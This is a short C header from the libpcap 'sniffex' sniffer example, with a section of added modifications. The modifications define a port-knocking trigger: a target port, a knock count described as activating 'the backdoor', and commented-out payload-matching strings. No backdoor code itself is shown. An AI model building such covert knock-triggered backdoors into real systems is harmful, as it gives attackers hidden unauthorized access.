
#define APP_NAME		"sniffex"
#define APP_DESC		"Sniffer example using libpcap"
#define APP_COPYRIGHT	"Copyright (c) 2005 The Tcpdump Group"
#define APP_DISCLAIMER	"THERE IS ABSOLUTELY NO WARRANTY FOR THIS PROGRAM."



/* default snap length (maximum bytes per packet to capture) */
#define SNAP_LEN 1518

/* ethernet headers are always exactly 14 bytes [1] */
#define SIZE_ETHERNET 14

/* Ethernet addresses are 6 bytes */
#define ETHER_ADDR_LEN	6





// -----------------------------  M Y   M O D I F I C A T I O N S  ----------------------------------



// the target port knocking port
#define TARGET_PORTS 	(int[]) {200}

// number of knocks to activate the backdoor
#define NUM_TARGETS 1

// bytes in payload to check against
// #define TARGET_STR "qwerty"

// if defined, we will print this number of bytes in the payload after the target string
// #define PAYLOAD_SIZE 8
